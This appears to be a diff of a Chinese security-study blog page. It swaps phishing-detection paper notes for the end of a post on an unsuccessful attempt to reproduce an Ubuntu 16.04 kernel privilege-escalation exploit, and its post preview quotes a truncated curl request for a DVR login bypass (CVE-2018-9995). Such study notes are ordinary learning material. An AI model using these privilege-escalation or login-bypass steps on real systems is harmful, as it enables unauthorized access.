+<p>由于自己对exp不理解，只是复现一下，并且没成功的原因是版本问题，所以就不再继续进行了。现有文章基本都是某一篇转来转去的，其中说的影响的版本，应该是说大了。</p>
+<p>最后再把内核版本号改回来，改成4.15。</p>
 <p>收获：</p>
-<p>1、这里提出了3个数据集，可供自己用。做实验的时候，也可以像本文一样，三个数据集分开实验，分别论述，能够增加篇幅…(凑字数专用)</p>
-<p>2、其实说白了，本文方法就是：把多个分类器的预测结果结合一下，得到最终的结果。最终的分类结果可能比单个分类器的效果要好。但是总觉得创新不算太大，很多地方叙述的不是很清楚。</p>
-<p>3、本文的参考文章，有几篇可以之后看一下的</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[13] Chiew, K. L., Tan, C. L., Wong, K., Yong, K. S., and Tiong, W. K. (2019). A new hybrid ensemble feature selection framework for machine learning-based phishing detection system. *Information Sciences*, 484, 153-166.</span><br><span class="line"></span><br><span class="line">[14] Ding, Y., Luktarhan, N., Li, K., and Slamu, W. (2019). A Keyword-based Combination Approach for Detecting Phishing Webpages. *Computers and Security*.</span><br><span class="line"></span><br><span class="line">[16] Rao, R. S., and Ali, S. T. (2015, April). A computer vision technique to detect phishing attacks. *In 2015 Fifth International Conference on Communication Systems and Network Technologies* (pp. 596-601). IEEE</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="基于机器学习钓鱼检测系统的新型混合总体特征选择框架"><a href="#基于机器学习钓鱼检测系统的新型混合总体特征选择框架" class="headerlink" title="基于机器学习钓鱼检测系统的新型混合总体特征选择框架"></a>基于机器学习钓鱼检测系统的新型混合总体特征选择框架</h2><p>1、文章发表期刊：information science。属于ccf b类，计算机类一区。但是知乎上也有人说不算太好，比较水(甚至和access放在一起)。作者来自马来西亚Sarawak大学、马来西亚Monash大学。</p>
-<p>收获：</p>
-<p>1、</p>
-<hr>
-<p>2、HEFS：混合总体特征选择</p>
-<p>第一阶段：执行新型的累积分布函数梯度算法(CDF-g)，去产生初始的特征子集。</p>
-<p>第二阶段：用第一阶段的结果，进行数据扰动，去产生第二阶段的特征子集。这里使用了一系列基线特征。</p>
-<p>This paper proposes a new feature selection framework for machine learning-based phish- ing detection system, called the Hybrid Ensemble Feature Selection (HEFS). In the first phase of HEFS, a novel Cumulative Distribution Function gradient (CDF-g) algorithm is ex- ploited to produce primary feature subsets, which are then fed into a data perturbation ensemble to yield secondary feature subsets. The second phase derives a set of baseline features from the secondary feature subsets by using a function perturbation ensemble. The overall experimental results suggest that HEFS performs best when it is integrated with Random Forest classifier, where the baseline features correctly distinguish 94.6% of phishing and legitimate websites using only 20.8% of the original features. In another ex- periment, the baseline features (10 in total) utilised on Random Forest outperforms the set of all features (48 in total) used on SVM, Naive Bayes, C4.5, JRip, and PART classi- fiers. HEFS also shows promising results when benchmarked using another well-known phishing dataset from the University of California Irvine (UCI) repository. Hence, the HEFS is a highly desirable and practical feature selection technique for machine learning-based phishing detection systems.</p>
+<p>1、找到了很多资源，可以直接去库里搜对应版本的exp。</p>
+<p>2、内核漏洞可能导致系统崩溃，并且还会留下记录，有文章说能不用就少用。</p>
+<p>参考</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.shengchulai.com/blog-RiTtVguWqf.htm">Linux本地提权漏洞复现与检测思路 by 生出来</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97183">ubuntu本地提权漏洞 by 知道创宇</a></p>
+</li>
+</ul>
 
   
   
@@ -503,7 +505,7 @@
               
             
               
-                <p>本文永久链接是：<a href=http://example.com/2021/03/30/%E6%81%B6%E6%84%8Furl%E5%85%AD/>http://example.com/2021/03/30/%E6%81%B6%E6%84%8Furl%E5%85%AD/</a></p>
+                <p>本文永久链接是：<a href=http://example.com/2021/04/02/ubuntu16-04%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/>http://example.com/2021/04/02/ubuntu16-04%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</a></p>
               
             
           </blockquote>
@@ -520,10 +522,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T17:45:11+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-03T14:57:13+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Apr 1, 2021</p>
+    <p>更新于：Apr 3, 2021</p>
   </a>
 </div>
 
@@ -542,7 +544,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/03/30/%E6%81%B6%E6%84%8Furl%E5%85%AD/&title=恶意url六 - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/04/02/ubuntu16-04%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=ubuntu16.04本地提权漏洞 - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -554,7 +556,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/03/30/%E6%81%B6%E6%84%8Furl%E5%85%AD/&title=恶意url六 - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/04/02/ubuntu16-04%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=ubuntu16.04本地提权漏洞 - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -566,7 +568,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/03/30/%E6%81%B6%E6%84%8Furl%E5%85%AD/&title=恶意url六 - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/04/02/ubuntu16-04%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=ubuntu16.04本地提权漏洞 - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -596,31 +598,11 @@
   
     <div class="prev-next">
       
-        <a class='prev' href='/2021/03/31/struts2%5Bs2-052%5D%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>struts2[s2-052]远程命令执行漏洞复现</p>
-          <p class='content'>漏洞信息编号：CVE-2017-9805
-环境搭建1、Windows 10(64位)
-2、tomcat9.0
-参考
-安装配置 by荆棘云海
- startup错误解决 by Jessica-小波
-...</p>
-        </a>
       
-      
-        <a class='next' href='/2021/03/30/leetCode01/'>
-          <p class='title'>leetCode01<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>3.301、193. 有效电话号码
-
-考点
-
-1、grep的用法
--P 表示Perl语言的正则表达式
-
-思路
-
-正则匹配，注意格式以及能否优化代码
-参考https://leetcode-cn.c...</p>
+        <a class='next' href='/2021/04/01/DVR%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/'>
+          <p class='title'>DVR登陆绕过漏洞<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>漏洞信息CVE-2018-9995
+利用过程语句 curl &quot;http://&lt;dvr_host&gt;:&lt;port&gt;/device.rsp?opt=user&amp;...</p>
         </a>
       
     </div>
@@ -663,7 +645,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PhishStack-%E9%92%93%E9%B1%BCURL%E6%A3%80%E6%B5%8B%E4%B8%AD%E5%A0%86%E5%8F%A0%E6%B3%9B%E5%8C%96%E7%9A%84%E8%AF%84%E4%BC%B0"><span class="toc-text">PhishStack:钓鱼URL检测中堆叠泛化的评估</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E9%92%93%E9%B1%BC%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%B0%E5%9E%8B%E6%B7%B7%E5%90%88%E6%80%BB%E4%BD%93%E7%89%B9%E5%BE%81%E9%80%89%E6%8B%A9%E6%A1%86%E6%9E%B6"><span class="toc-text">基于机器学习钓鱼检测系统的新型混合总体特征选择框架</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELinux%E6%8F%90%E6%9D%83"><span class="toc-text">关于Linux提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞触发</span></a></li></ol>
     </div>
   </section>
 
@@ -683,7 +665,7 @@
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="恶意url六";
+  pdata.postTitle="ubuntu16.04本地提权漏洞";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
